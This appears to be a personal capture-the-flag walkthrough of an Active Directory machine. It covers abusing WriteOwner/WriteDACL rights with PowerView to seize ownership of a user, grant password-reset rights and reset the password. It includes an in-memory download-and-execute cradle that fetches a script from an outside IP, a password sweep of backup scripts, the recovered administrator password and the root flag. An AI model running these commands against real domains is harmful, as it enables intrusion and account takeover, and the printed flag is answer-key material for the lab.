
Now we know that Nico has write access to Herman.

Herman is having genric write and WriteDACL to Backup_Admin
![[Pasted image 20240514035852.png]]

If we search write owner in AD security (i.e. Scanning for Active Directory Privileges & Privileged Accounts) https://adsecurity.org/?p=3658

![[Pasted image 20240514040331.png]]

![[Pasted image 20240514040453.png]]

So in order to exploit this we have to load Power Viewer.
```
IEX (New-Object Net.Webclient).downloadstring("http://10.10.16.20:80/PowerView.ps1")
```


Now the very 1st step is to take ownership from Herman to Nico
```
Set-DomainObjectOwner -Identity Herman -OwnerIdentity nico -verbose
```

```
Add-DomainObjectAcl -TargetIdentity Herman -PrincipalIdentity nico -Rights ResetPassword -Verbose
```


So if now we run the Bloodhound we can see that we have the write owner as well as Force Password Change.
![[Pasted image 20240514042312.png]]

```
$pass = ConvertTo-SecureString 'PleaseSubscribe!' -AsPlainText -Force
```

So now let's try login with Herman
```
PleaseSubscribe!
```

Now will change the password
```
Set-DomainUserPassword Herman -AccountPassword $pass -verbose
```

So we are finally in 
![[Pasted image 20240514043326.png]]

How we have to make Herman a member of Backup_admin
![[Pasted image 20240514043417.png]]


```
Get-DomainGroup -MemberIdentity <User/Group>
```
https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993
![[Pasted image 20240514043644.png]]


```
Get-DomainGroup -MemberIdentity Herman | select samaccountname
```
![[Pasted image 20240514043838.png]]

I don't know but i have to run the script again in order to get it work
![[Pasted image 20240514044804.png]]

Will ssh to Herman again 
![[Pasted image 20240514045031.png]]
but we don't have the access to root.txt

Than simply means that we have to hassle a little more to get the password.
![[Pasted image 20240514045317.png]]
If you see we have a backup scripts folder which looks suspicious to me and i have a hunch that we will get something from here.
```
type * | findstr password
```
![[Pasted image 20240514045415.png]]

```
Cr4ckMeIfYouC4n!
```

And if we do ssh to the administrator
![[Pasted image 20240514045712.png]]

We can read the root flag
```
876b2385b3deed360e94b0276029e5f5
```

